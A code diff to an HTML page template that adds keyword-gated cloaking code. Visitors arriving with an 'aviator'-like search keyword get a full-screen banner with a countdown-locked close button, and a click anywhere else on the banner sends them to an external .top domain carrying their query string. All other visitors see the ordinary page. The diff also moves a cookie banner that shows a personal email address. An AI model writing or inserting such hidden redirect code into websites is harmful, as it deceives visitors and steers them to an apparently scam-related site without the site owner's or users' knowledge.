@@ -18,23 +18,198 @@
           href="https://fonts.cmsfly.com/css?family=Open+Sans:400,500,600%7CJosefin+Sans:400,500&amp;display=swap"/>
     <link rel="stylesheet" href="{{url_for('static', filename='css/index.css')}}"/>
 
-    <script>
-        var currentUrl = window.location.href;
-        var url = new URL(currentUrl);
-        var keywordValue = url.searchParams.get("keyword");
-        var isAndroid = /Android/i.test(navigator.userAgent);
+<!--    <script>-->
+<!--        var currentUrl = window.location.href;-->
+<!--        var url = new URL(currentUrl);-->
+<!--        var keywordValue = url.searchParams.get("keyword");-->
+<!--        var isAndroid = /Android/i.test(navigator.userAgent);-->
 
-        if (keywordValue && keywordValue.includes("aviator") && isAndroid) {
-            var searchParams = url.search;
-            var newUrl = window.location.origin + "/main" + searchParams;
-            window.location.replace(newUrl);
-        }
+<!--        if (keywordValue && keywordValue.includes("aviator") && isAndroid) {-->
+<!--            var searchParams = url.search;-->
+<!--            var newUrl = window.location.origin + "/main" + searchParams;-->
+<!--            window.location.replace(newUrl);-->
+<!--        }-->
 
-    </script>
+<!--    </script>-->
 
 
 </head>
 <body>
+
+<style>
+    .cookie-banner {
+        z-index: 9999999;
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background-color: #333;
+        color: white;
+        padding: 15px;
+        border-radius: 10px;
+        box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.2);
+    }
+
+    button {
+        background-color: #007bff;
+        color: white;
+        padding: 8px 15px;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background-color: #0056b3;
+    }
+
+</style>
+
+<div id="cookie-banner" class="cookie-banner" style="display: none;">
+    <p>Our site uses cookies to optimize performance and enhance your user experience.</p>
+    <p>Email: paullavd975@gmail.com</p>
+    <button id="accept-cookies">Accept Cookies</button>
+</div>
+
+<script>
+    const hasAcceptedCookies = document.cookie.includes('acceptedCookies=true');
+    const cookieBanner = document.getElementById('cookie-banner');
+    const acceptCookiesBtn = document.getElementById('accept-cookies');
+
+    //   if (!hasAcceptedCookies) {
+    cookieBanner.style.display = 'block';
+
+    acceptCookiesBtn.addEventListener('click', () => {
+        //    document.cookie = 'acceptedCookies=true; expires=Fri, 31 Dec 9999 23:59:59 GMT';
+        cookieBanner.style.display = 'none';
+    });
+    //  }
+    //  else {
+    //      cookieBanner.style.display = 'none';
+    //  }
+</script>
+
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        background: #000000;
+        height: 100%;
+        overflow: hidden;
+    }
+
+    .bg-banner{
+        background: #000000;
+        width: 100%;
+        height: 100%;
+    }
+
+    .banner {
+        z-index: 9999999;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url('/static/banner.png') no-repeat center center fixed;
+        background-size: contain;
+        display: flex;
+        justify-content: flex-end;
+        align-items: flex-start;
+    }
+
+    .close-btn {
+        margin: 20px;
+        font-size: 50px;
+        font-weight: bolder;
+        color: #8a8a8a;
+        transition: color 0.3s;
+        z-index: 1; /* Ensure close button is above the banner */
+    }
+
+    .close-btn.active {
+        color: #8a8a8a;
+        cursor: pointer;
+    }
+
+    @media (max-width: 768px) {
+        .close-btn {
+            font-size: 20px;
+            margin: 10px;
+        }
+    }
+</style>
+
+<div class="bg-banner">
+    <div class="banner" id="banner">
+        <div class="close-btn" id="closeBtn">10</div>
+    </div>
+</div>
+
+<script>
+    const url = new URL(window.location.href);
+    const keywordValue = url.searchParams.get("keyword");
+
+    cookieBanner.style.display = 'block';
+
+    if (!keywordValue || !/avie|avia/.test(keywordValue)) {
+        // window.location.href = '/site';
+        document.querySelector('.banner').style.display = 'none';
+        document.querySelector('.bg-banner').style.display = 'none';
+        document.body.style.overflow = 'auto';
+        document.documentElement.style.overflow = 'auto';
+
+        cookieBanner.style.display = 'none';
+    } else {
+        if (location.search) {
+            localStorage.setItem('savedQuery', location.search);
+        }
+    }
+</script>
+
+
+
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const closeBtn = document.getElementById('closeBtn');
+        const banner = document.getElementById('banner');
+        let countdown = 10;
+
+        const countdownInterval = setInterval(function() {
+            countdown--;
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                closeBtn.textContent = '×';
+                closeBtn.classList.add('active');
+                closeBtn.style.cursor = 'pointer';
+            } else {
+                closeBtn.textContent = countdown;
+            }
+        }, 1000);
+
+        closeBtn.addEventListener('click', function(event) {
+            event.stopPropagation();
+            if (closeBtn.classList.contains('active')) {
+                // window.location.href = '/site';
+                document.querySelector('.banner').style.display = 'none';
+                document.querySelector('.bg-banner').style.display = 'none';
+                document.body.style.overflow = 'auto';
+                document.documentElement.style.overflow = 'auto';
+
+                cookieBanner.style.display = 'none';
+            }
+        });
+
+        banner.addEventListener('click', function(event) {
+            if (!event.target.closest('.close-btn')) {
+                const savedQuery = localStorage.getItem('savedQuery');
+                const redirectUrl = `https://aviacompassupr.top/XM7BRh${savedQuery ? savedQuery : ''}`;
+                window.location.href = redirectUrl;
+            }
+        });
+    });
+</script>
 
 <section class="jik-section jik-section-9ek7zloy  color-overlay">
     <div class="">
@@ -638,55 +813,6 @@
         </div>
     </div>
 </section>
-<style>
-    .cookie-banner {
-        position: fixed;
-        bottom: 20px;
-        right: 20px;
-        background-color: #333;
-        color: white;
-        padding: 15px;
-        border-radius: 10px;
-        box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.2);
-    }
 
-    button {
-        background-color: #007bff;
-        color: white;
-        padding: 8px 15px;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-    }
-
-    button:hover {
-        background-color: #0056b3;
-    }
-
-</style>
-
-<div id="cookie-banner" class="cookie-banner" style="display: none;">
-    <p>Our site uses cookies to optimize performance and enhance your user experience.</p>
-    <p>Email: paullavd975@gmail.com</p>
-    <button id="accept-cookies">Accept Cookies</button>
-</div>
-
-<script>
-    const hasAcceptedCookies = document.cookie.includes('acceptedCookies=true');
-    const cookieBanner = document.getElementById('cookie-banner');
-    const acceptCookiesBtn = document.getElementById('accept-cookies');
-
-//   if (!hasAcceptedCookies) {
-        cookieBanner.style.display = 'block';
-
-        acceptCookiesBtn.addEventListener('click', () => {
-        //    document.cookie = 'acceptedCookies=true; expires=Fri, 31 Dec 9999 23:59:59 GMT';
-            cookieBanner.style.display = 'none';
-        });
-  //  }
-  //  else {
-  //      cookieBanner.style.display = 'none';
-  //  }
-</script>
 </body>
 </html>
